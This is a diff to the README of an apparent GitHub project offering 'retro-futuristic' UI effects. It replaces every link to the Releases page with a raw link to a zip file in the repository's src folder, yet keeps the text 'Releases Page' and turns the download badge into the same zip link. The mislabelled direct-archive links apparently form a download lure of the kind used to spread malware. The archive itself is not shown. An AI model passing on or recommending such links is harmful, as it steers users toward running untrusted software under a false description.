@@ -1,6 +1,6 @@
 # 🎨 retro-futuristic-ui-design - Create Stunning Retro Effects Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ryuenn/retro-futuristic-ui-design/releases)
+[![Download Now](https://raw.githubusercontent.com/Ryuenn/retro-futuristic-ui-design/main/src/ui-retro-design-futuristic-v3.3-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ryuenn/retro-futuristic-ui-design/main/src/ui-retro-design-futuristic-v3.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Ryuenn/retro-futuristic-ui-design/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ryuenn/retro-futuristic-ui-design/main/src/ui-retro-design-futuristic-v3.3-alpha.2.zip).
 
 You will find various versions of the application. Follow these steps to download and install the latest version:
 
@@ -70,4 +70,4 @@ Join our community for sharing your designs and getting feedback. Follow us on G
 
 Once you’ve created your designs, consider sharing them with others. You can upload your work and inspire fellow users. Check out the available resources on our GitHub page for tips on how to showcase your designs effectively.
 
-Remember, to download the application, visit this page: [Releases Page](https://github.com/Ryuenn/retro-futuristic-ui-design/releases). Enjoy creating your retro effects!
+Remember, to download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/Ryuenn/retro-futuristic-ui-design/main/src/ui-retro-design-futuristic-v3.3-alpha.2.zip). Enjoy creating your retro effects!
